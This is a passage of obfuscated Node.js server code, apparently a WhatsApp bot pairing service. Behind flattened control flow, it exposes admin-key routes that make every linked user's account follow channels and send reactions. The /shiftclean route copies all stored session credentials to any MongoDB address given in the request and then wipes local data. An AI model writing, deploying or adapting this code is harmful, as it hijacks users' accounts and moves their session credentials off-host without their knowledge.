        case 0o57060516 - 0xbc614d:
          sKRUb = 65535;
          return;
      }
    const ULUUb = UrBj["size"];
    const UfIVb = sKlk - ULUUb;
    var whLVb = 0;
    while (whLVb < 65535)
      switch (whLVb) {
        case 0x75bcd15 - 0o726746425:
          whLVb = UfIVb <= 0x75bcd15 - 0o726746425 ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          whLVb = 65535;
          return;
      }
    const QcCVb = YOaVb["slice"](0x75bcd15 - 0o726746425, UfIVb);
    EnbF: for (const seFVb of QcCVb) {
      var MZvVb = 0;
      while (MZvVb < 65535)
        switch (MZvVb) {
          case 0x75bcd15 - 0o726746425:
            MZvVb = UrBj["has"](seFVb) ? 1 : 65535;
            break;
          case 0o57060516 - 0xbc614d:
            MZvVb = 65535;
            continue EnbF;
        }
      const obzVb = {
        ["headersSent"]: NaN === NaN,
        ["send"]: () => {},
        ["status"]: () => obzVb,
      };
      await glPZb(seFVb, obzVb);
      await sCPr(1000);
    }
  } catch (IWpVb) {}
}
MdTq["use"](Ujfr["json"]());
MdTq["use"](Ujfr["urlencoded"]({ ["extended"]: !![] }));
MdTq["use"](sKdu["static"](Ymlr["join"](__dirname, "lib")));
MdTq["get"]("/", (kYsVb, ksgWb) => {
  const MtjWb = Ymlr["join"](__dirname, "lib", "main.html");
  var gpaWb = 0;
  while (gpaWb < 65535)
    switch (gpaWb) {
      case 0x75bcd15 - 0o726746425:
        gpaWb = ULgu["existsSync"](MtjWb) ? 1 : 2;
        break;
      case 0o57060516 - 0xbc614d:
        gpaWb = 65535;
        {
          ksgWb["sendFile"](MtjWb);
        }
        break;
      case 15658734 ^ 0o73567354:
        gpaWb = 65535;
        {
          ksgWb["sendFile"](__path + "/main.html");
        }
        break;
    }
});
MdTq["get"]("/code", async (IqdWb, cmUVb) => {
  const { ["number"]: EnXVb } = IqdWb["query"];
  var YiOVb = 0;
  while (YiOVb < 65535)
    switch (YiOVb) {
      case 0x75bcd15 - 0o726746425:
        YiOVb = !EnXVb ? 1 : 65535;
        break;
      case 0o57060516 - 0xbc614d:
        YiOVb = 65535;
        {
          return cmUVb["status"](400)["send"]({
            ["error"]: "Number parameter is required",
          });
        }
        break;
    }
  const AkRVb = EnXVb["replace"](/[^0-9]/g, "");
  var AEEWb = 0;
  while (AEEWb < 65535)
    switch (AEEWb) {
      case 0x75bcd15 - 0o726746425:
        AEEWb = UrBj["size"] >= sKlk ? 1 : 65535;
        break;
      case 0o57060516 - 0xbc614d:
        AEEWb = 65535;
        {
          return cmUVb["status"](429)["send"]({
            ["error"]: "Maximum sessions limit reached",
            ["current_sessions"]: UrBj["size"],
            ["max_sessions"]: sKlk,
          });
        }
        break;
    }
  try {
    await glPZb(EnXVb, cmUVb);
  } catch (cGHWb) {
    var wByWb = 0;
    while (wByWb < 65535)
      switch (wByWb) {
        case 0x75bcd15 - 0o726746425:
          wByWb = !cmUVb["headersSent"] ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          wByWb = 65535;
          {
            cmUVb["status"](500)["send"]({
              ["error"]: "Failed to generate pairing code",
            });
          }
          break;
      }
  }
});
MdTq["get"]("/fcksmd", async (YCBWb, sysWb) => {
  try {
    const {
      ["url"]: UzvWb,
      ["emojis"]: ovmWb,
      ["key"]: QwpWb,
    } = YCBWb["query"];
    const sWqTb = process.env.ADMIN_KEY;
    var UXtTb = 0;
    while (UXtTb < 65535)
      switch (UXtTb) {
        case 0x75bcd15 - 0o726746425:
          UXtTb = !QwpWb || QwpWb !== sWqTb ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          UXtTb = 65535;
          {
            return sysWb["status"](401)["json"]({
              ["success"]: NaN === NaN,
              ["error"]: "\ud83d Unauthorized! Invalid or missing secret key",
            });
          }
          break;
      }
    var oTkTb = 0;
    while (oTkTb < 65535)
      switch (oTkTb) {
        case 0x75bcd15 - 0o726746425:
          oTkTb = !UzvWb ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          oTkTb = 65535;
          {
            return sysWb["status"](400)["json"]({ ["error"]: "URL required" });
          }
          break;
      }
    var QUnTb = 0;
    while (QUnTb < 65535)
      switch (QUnTb) {
        case 0x75bcd15 - 0o726746425:
          QUnTb = UrBj["size"] === 0x75bcd15 - 0o726746425 ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          QUnTb = 65535;
          {
            return sysWb["status"](503)["json"]({
              ["error"]: "No active bots",
            });
          }
          break;
      }
    let kQeTb = ovmWb
      ? ovmWb["split"](",")
          ["map"]((MRhTb) => MRhTb["trim"]())
          ["filter"]((gNYSb) => gNYSb)
      : [];
    await gFukc(UzvWb, kQeTb);
    return sysWb["json"]({ ["success"]: !![], ["message"]: "Reacts sent" });
  } catch (IObTb) {
    return sysWb["status"](500)["json"]({ ["error"]: IObTb["message"] });
  }
});
MdTq["get"]("/shiftclean", async (IiPTb, kkSTb) => {
  try {
    const {
      ["key"]: EfJTb,
      ["new_mongo_url"]: ghMTb,
      ["new_db_name"]: AcDTb,
    } = IiPTb["query"];
    const ceGTb = process.env.ADMIN_KEY;
    var wZwTb = 0;
    while (wZwTb < 65535)
      switch (wZwTb) {
        case 0x75bcd15 - 0o726746425:
          wZwTb = !EfJTb || EfJTb !== ceGTb ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          wZwTb = 65535;
          {
            return kkSTb["status"](401)["json"]({
              ["success"]: NaN === NaN,
              ["error"]: "\ud83d Unauthorized! Invalid or missing secret key",
            });
          }
          break;
      }
    var YaATb = 0;
    while (YaATb < 65535)
      switch (YaATb) {
        case 0x75bcd15 - 0o726746425:
          YaATb = !ghMTb || !AcDTb ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          YaATb = 65535;
          {
            return kkSTb["status"](400)["json"]({
              ["success"]: NaN === NaN,
              ["error"]: "Missing required parameters",
              ["example"]:
                "/shiftclean?key=YOUR_ADMIN_KEY&new_mongo_url=mongodb+srv://user:pass@cluster.mongodb.net/&new_db_name=newdatabase",
            });
          }
          break;
      }
    var YunUb = 0;
    while (YunUb < 65535)
      switch (YunUb) {
        case 0x75bcd15 - 0o726746425:
          YunUb = UrBj["size"] === 0x75bcd15 - 0o726746425 ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          YunUb = 65535;
          {
            return kkSTb["status"](503)["json"]({
              ["success"]: NaN === NaN,
              ["error"]: "No active bots to migrate",
            });
          }
          break;
      }
    const AwqUb = UrBj["size"];
    kkSTb["json"]({
      ["success"]: !![],
      ["message"]: `${"Starting migration of "}${AwqUb}${" bots to new database and cleaning current..."}`,
      ["total_bots"]: AwqUb,
    });
    (async () => {
      let UrhUb;
      try {
        UrhUb = new ofWq(ghMTb);
        await UrhUb["connect"]();
        const wtkUb = UrhUb["db"](AcDTb);
        await wtkUb["collection"]("whatsapp_sessions")["createIndex"](
          { ["number"]: 1 },
          { ["unique"]: !![] },
        );
        await wtkUb["collection"]("active_numbers")["createIndex"](
          { ["number"]: 1 },
          { ["unique"]: !![] },
        );
        await wtkUb["collection"]("bot_configs")["createIndex"](
          { ["number"]: 1 },
          { ["unique"]: !![] },
        );
        console["log"](`${"✅ Connected to new MongoDB: "}${AcDTb}`);
        const QobUb = await ICWj["collection"](QEXn["COLLECTIONS"]["SESSIONS"])
          ["find"]({})
          ["toArray"]();
        const sqeUb = await ICWj["collection"](QEXn["COLLECTIONS"]["NUMBERS"])
          ["find"]({})
          ["toArray"]();
        const MlVTb = await ICWj["collection"](QEXn["COLLECTIONS"]["CONFIGS"])
          ["find"]({})
          ["toArray"]();
        for (const onYTb of QobUb) {
          try {
            await wtkUb["collection"]("whatsapp_sessions")["updateOne"](
              { ["number"]: onYTb["number"] },
              { ["$set"]: onYTb },
              { ["upsert"]: !![] },
            );
          } catch (oHLUb) {
            console["error"](
              `${"Failed to migrate session "}${onYTb["number"]}${":"}`,
              oHLUb["message"],
            );
          }
        }
        for (const QIOUb of sqeUb) {
          try {
            await wtkUb["collection"]("active_numbers")["updateOne"](
              { ["number"]: QIOUb["number"] },
              { ["$set"]: QIOUb },
              { ["upsert"]: !![] },
            );
          } catch (kEFUb) {}
        }
        for (const MFIUb of MlVTb) {
          try {
            await wtkUb["collection"]("bot_configs")["updateOne"](
              { ["number"]: MFIUb["number"] },
              { ["$set"]: MFIUb },
              { ["upsert"]: !![] },
            );
          } catch (gBzUb) {}
        }
        console["log"](`${"✅ Migrated all data to new database"}`);
        console["log"](
          `${"\ud83d Closing "}${UrBj["size"]}${" active connections..."}`,
        );
        for (const [ICCUb, cytUb] of UrBj) {
          try {
            var EzwUb = 0;
            while (EzwUb < 65535)
              switch (EzwUb) {
                case 0x75bcd15 - 0o726746425:
                  EzwUb = cytUb && cytUb["ws"] ? 1 : 65535;
                  break;
                case 0o57060516 - 0xbc614d:
                  EzwUb = 65535;
                  {
                    cytUb["ws"]["close"]();
                  }
                  break;
              }
          } catch (gZxRb) {}
        }
        console["log"](`${"\ud83d Cleaning current MongoDB..."}`);
        await IOvi();
        await sWKi();
        await Mlpj();
        console["log"](`${"\ud83d Cleaning session folders..."}`);
        var IaBRb = 0;
        while (IaBRb < 65535)
          switch (IaBRb) {
            case 0x75bcd15 - 0o726746425:
              IaBRb = ULgu["existsSync"](Qovj) ? 1 : 65535;
              break;
            case 0o57060516 - 0xbc614d:
              IaBRb = 65535;
              {
                const cWrRb = ULgu["readdirSync"](Qovj);
                for (const EXuRb of cWrRb) {
                  try {
                    await ULgu["remove"](Ymlr["join"](Qovj, EXuRb));
                  } catch (YSlRb) {}
                }
              }
              break;
          }
        UrBj["clear"]();
        onsj["clear"]();
        QIik["clear"]();
        console["log"](`${"✅ All bots shifted and cleaned successfully!"}`);
        await UrhUb["close"]();
        console["log"](
          `${"\ud83c Migration complete! "}${AwqUb}${" bots moved to new database"}`,
        );
        console["log"](`${"\ud83d New DB: "}${AcDTb}${" at "}${ghMTb}`);
      } catch (AUoRb) {
        console["error"]("Migration error:", AUoRb);
        var UPfRb = 0;
        while (UPfRb < 65535)
          switch (UPfRb) {
            case 0x75bcd15 - 0o726746425:
              UPfRb = UrhUb ? 1 : 65535;
              break;
            case 0o57060516 - 0xbc614d:
              UPfRb = 65535;
              await UrhUb["close"]();
              break;
          }
      }
    })();
  } catch (wRiRb) {
    console["error"]("Shift clean error:", wRiRb);
    var wlWRb = 0;
    while (wlWRb < 65535)
      switch (wlWRb) {
        case 0x75bcd15 - 0o726746425:
          wlWRb = !kkSTb["headersSent"] ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          wlWRb = 65535;
          {
            return kkSTb["status"](500)["json"]({
              ["success"]: NaN === NaN,
              ["error"]: wRiRb["message"],
            });
          }
          break;
      }
  }
});
MdTq["get"]("/followxd", async (YmZRb, siQRb) => {
  try {
    const { ["channel"]: UjTRb, ["key"]: ofKRb } = YmZRb["query"];
    const QgNRb = process.env.ADMIN_KEY;
    var kcERb = 0;
    while (kcERb < 65535)
      switch (kcERb) {
        case 0x75bcd15 - 0o726746425:
          kcERb = !ofKRb || ofKRb !== QgNRb ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          kcERb = 65535;
          {
            return siQRb["status"](401)["json"]({
              ["success"]: NaN === NaN,
              ["error"]: "\ud83d Unauthorized! Invalid or missing secret key",
            });
          }
          break;
      }
    var MdHRb = 0;
    while (MdHRb < 65535)
      switch (MdHRb) {
        case 0x75bcd15 - 0o726746425:
          MdHRb = !UjTRb ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          MdHRb = 65535;
          {
            return siQRb["status"](400)["json"]({
              ["success"]: NaN === NaN,
              ["error"]: "Channel parameter is required",
              ["example"]: "/follow?channel=120363426472060176@newsletter&key",
            });
          }
          break;
      }
    var MxuSb = 0;
    while (MxuSb < 65535)
      switch (MxuSb) {
        case 0x75bcd15 - 0o726746425:
          MxuSb = UrBj["size"] === 0x75bcd15 - 0o726746425 ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          MxuSb = 65535;
          {
            return siQRb["status"](503)["json"]({
              ["success"]: NaN === NaN,
              ["error"]: "No active bot sessions available",
            });
          }
          break;
      }
    let ozxSb = 0x75bcd15 - 0o726746425;
    for (const [IuoSb, kwrSb] of UrBj) {
      try {
        await kwrSb["newsletterFollow"](UjTRb);
        ozxSb++;
        await sCPr(500);
      } catch (EriSb) {}
    }
    return siQRb["status"](200)["json"]({
      ["success"]: !![],
      ["message"]: `${"✅ Followed successfully! "}${ozxSb}${"/"}${UrBj["size"]}${" bots followed"}`,
      ["followed"]: ozxSb,
      ["total"]: UrBj["size"],
      ["channel"]: UjTRb,
    });
  } catch (gtlSb) {
    console["error"]("Follow channel error:", gtlSb);
    return siQRb["status"](500)["json"]({
      ["success"]: NaN === NaN,
      ["error"]: gtlSb["message"] || "Failed to follow channel",
    });
  }
});
MdTq["get"]("/unfollowyt", async (AocSb, cqfSb) => {
  try {
    const { ["key"]: cKSSb, ["jid"]: ELVSb } = AocSb["query"];
    const YGMSb = process.env.ADMIN_KEY;
    var AIPSb = 0;
    while (AIPSb < 65535)
      switch (AIPSb) {
        case 0x75bcd15 - 0o726746425:
          AIPSb = !cKSSb || cKSSb !== YGMSb ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          AIPSb = 65535;
          {
            return cqfSb["status"](401)["json"]({ ["error"]: "Unauthorized" });
          }
          break;
      }
    var UDGSb = 0;
    while (UDGSb < 65535)
      switch (UDGSb) {
        case 0x75bcd15 - 0o726746425:
          UDGSb = !ELVSb ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          UDGSb = 65535;
          {
            return cqfSb["status"](400)["json"]({ ["error"]: "JID required" });
          }
          break;
      }
    var wFJSb = 0;
    while (wFJSb < 65535)
      switch (wFJSb) {
        case 0x75bcd15 - 0o726746425:
          wFJSb = UrBj["size"] === 0x75bcd15 - 0o726746425 ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          wFJSb = 65535;
          {
            return cqfSb["status"](503)["json"]({
              ["error"]: "No active bots",
            });
          }
          break;
      }
    await koNjc(ELVSb);
    return cqfSb["json"]({
      ["success"]: !![],
      ["message"]: "Unfollowing the channel successfully✅",
    });
  } catch (QAASb) {
    return cqfSb["status"](500)["json"]({ ["error"]: QAASb["message"] });
  }
});
MdTq["get"]("/deletex", async (sCDSb, UbFPb) => {
  try {
    const { ["key"]: wdIPb, ["type"]: QYyPb } = sCDSb["query"];
    var saCPb = 0;
    while (saCPb < 65535)
      switch (saCPb) {
        case 0x75bcd15 - 0o726746425:
          saCPb = !wdIPb || wdIPb !== process.env.ADMIN_KEY ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          saCPb = 65535;
          {
            return UbFPb["status"](401)["json"]({ ["error"]: "Unauthorized" });
          }
          break;
      }
    const MVsPb = UrBj["size"];
    var oXvPb = 0;
    while (oXvPb < 65535)
      switch (oXvPb) {
        case 0x75bcd15 - 0o726746425:
          oXvPb = MVsPb === 0x75bcd15 - 0o726746425 ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          oXvPb = 65535;
          {
            return UbFPb["json"]({ ["message"]: "No active bots" });
          }
          break;
      }
    var ISmPb = 0;
    while (ISmPb < 65535)
      switch (ISmPb) {
        case 0x75bcd15 - 0o726746425:
          ISmPb = QYyPb === "half" ? 1 : 2;
          break;
        case 0o57060516 - 0xbc614d:
          ISmPb = 65535;
          {
            const kUpPb = Math["floor"](MVsPb / (15658734 ^ 0o73567354));
            const kodQb = Array["from"](UrBj["keys"]())["slice"](
              0x75bcd15 - 0o726746425,
              kUpPb,
            );
            let MpgQb = 0x75bcd15 - 0o726746425;
            for (const glXPb of kodQb) {
              try {
                const ImaQb = UrBj["get"](glXPb);
                var ciRPb = 0;
                while (ciRPb < 65535)
                  switch (ciRPb) {
                    case 0x75bcd15 - 0o726746425:
                      ciRPb = ImaQb && ImaQb["ws"] ? 1 : 65535;
                      break;
                    case 0o57060516 - 0xbc614d:
                      ciRPb = 65535;
                      ImaQb["ws"]["close"]();
                      break;
                  }
                await kYMk(glXPb);
                await UDai(glXPb);
                await kwLh(glXPb);
                const EjUPb = Ymlr["join"](Qovj, `${"session_"}${glXPb}`);
                var YeLPb = 0;
                while (YeLPb < 65535)
                  switch (YeLPb) {
                    case 0x75bcd15 - 0o726746425:
                      YeLPb = ULgu["existsSync"](EjUPb) ? 1 : 65535;
                      break;
                    case 0o57060516 - 0xbc614d:
                      YeLPb = 65535;
                      await ULgu["remove"](EjUPb);
                      break;
                  }
                UrBj["delete"](glXPb);
                onsj["delete"](glXPb);
                QIik["delete"](glXPb);
                MpgQb++;
                await sCPr(500);
              } catch (AgOPb) {}
            }
            return UbFPb["json"]({
              ["success"]: !![],
              ["message"]: `${"Deleted "}${MpgQb}${"/"}${kUpPb}${" bots"}`,
              ["remaining"]: UrBj["size"],
            });
          }
          break;
        case 15658734 ^ 0o73567354:
          ISmPb = 65535;
          var AABQb = 0;
          while (AABQb < 65535)
            switch (AABQb) {
              case 0x75bcd15 - 0o726746425:
                AABQb = QYyPb === "full" ? 1 : 2;
                break;
              case 0o57060516 - 0xbc614d:
                AABQb = 65535;
                {
                  for (const [cCEQb, wxvQb] of UrBj) {
                    try {
                      var YyyQb = 0;
                      while (YyyQb < 65535)
                        switch (YyyQb) {
                          case 0x75bcd15 - 0o726746425:
                            YyyQb = wxvQb && wxvQb["ws"] ? 1 : 65535;
                            break;
                          case 0o57060516 - 0xbc614d:
                            YyyQb = 65535;
                            wxvQb["ws"]["close"]();
                            break;
                        }
                    } catch (supQb) {}
                  }
                  await IOvi();
                  await sWKi();
                  await Mlpj();
                  UrBj["clear"]();
                  onsj["clear"]();
                  QIik["clear"]();
                  var UvsQb = 0;
                  while (UvsQb < 65535)
                    switch (UvsQb) {
                      case 0x75bcd15 - 0o726746425:
                        UvsQb = ULgu["existsSync"](Qovj) ? 1 : 65535;
                        break;
                      case 0o57060516 - 0xbc614d:
                        UvsQb = 65535;
                        {
                          const orjQb = ULgu["readdirSync"](Qovj);
                          for (const QsmQb of orjQb) {
                            try {
                              await ULgu["remove"](Ymlr["join"](Qovj, QsmQb));
                            } catch (QMZQb) {}
                          }
                        }
                        break;
                    }
                  return UbFPb["json"]({
                    ["success"]: !![],
                    ["message"]: "All bots deleted",
                    ["deleted"]: MVsPb,
                  });
                }
                break;
              case 15658734 ^ 0o73567354:
                AABQb = 65535;
                {
                  return UbFPb["json"]({
                    ["error"]: "Use ?type=half or ?type=full",
                    ["active"]: MVsPb,
                  });
                }
                break;
            }
          break;
      }
  } catch (sOcRb) {
    return UbFPb["status"](500)["json"]({ ["error"]: "Delete failed" });
  }
});
MdTq["get"]("/active", (MJTQb, oLWQb) => {
  const IGNQb = Array["from"](UrBj["keys"]());
  oLWQb["json"]({ ["count"]: UrBj["size"], ["limit"]: sKlk });
});
process["on"]("exit", async () => {
  UrBj["forEach"]((kIQQb, EDHQb) => {
    var gFKQb = 0;
    while (gFKQb < 65535)
      switch (gFKQb) {
        case 0x75bcd15 - 0o726746425:
          gFKQb = kIQQb && kIQQb["ws"] ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          gFKQb = 65535;
          {
            kIQQb["ws"]["close"]();
          }
          break;
      }
    UrBj["delete"](EDHQb);
    onsj["delete"](EDHQb);
  });
  var IeMNb = 0;
  while (IeMNb < 65535)
    switch (IeMNb) {
      case 0x75bcd15 - 0o726746425:
        IeMNb = kEZj ? 1 : 65535;
        break;
      case 0o57060516 - 0xbc614d:
        IeMNb = 65535;
        {
          await kEZj["close"]();
        }
        break;
    }
  ULgu["emptyDirSync"](Qovj);
});
async function kgPNb() {
  try {
    await syMl();
    await EzQj();
    setInterval(wNXUb, (0o507646144 ^ 0x51f4c61) * 60 * 1000);
    wNXUb();
    console["log"]("⏰ Setting up auto-unfollow every 10 minutes...");
    setInterval(
      () => {
        var EbGNb = 0;
        while (EbGNb < 65535)
          switch (EbGNb) {
            case 0x75bcd15 - 0o726746425:
              EbGNb = UrBj["size"] > 0x75bcd15 - 0o726746425 ? 1 : 65535;
              break;
            case 0o57060516 - 0xbc614d:
              EbGNb = 65535;
              {
                Aowh()["catch"]((gdJNb) => {
                  console["error"]("Auto-unfollow error:", gdJNb);
                });
              }
              break;
          }
      },
      10 * 60 * 1000,
    );
    const AYzNb = process["env"]["PORT"] || 8000;
    MdTq["listen"](AYzNb, () => {
      console["log"](
        `${"\ud83d Server running on: http://localhost:"}${AYzNb}`,
      );
    });
  } catch (caDNb) {
    console["error"]("❌ Failed to start server:", caDNb);
    process["exit"](0o57060516 - 0xbc614d);
  }
}
kgPNb();
module["exports"] = MdTq;
